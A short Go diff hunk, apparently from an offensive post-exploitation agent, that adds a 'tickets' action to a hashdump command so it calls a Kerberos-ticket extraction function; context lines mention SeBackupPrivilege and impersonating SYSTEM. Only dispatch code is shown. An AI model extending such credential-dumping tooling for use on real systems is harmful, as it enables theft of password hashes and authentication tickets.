@@ -75,6 +75,9 @@ func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult 
 	if args.Action == "insitu-full" {
 		return executeInsituFull()
 	}
+	if args.Action == "tickets" {
+		return executeKerbTickets()
+	}
 
 	// Enable SeBackupPrivilege on both process and thread tokens
 	// Thread token is needed when impersonating SYSTEM via getsystem
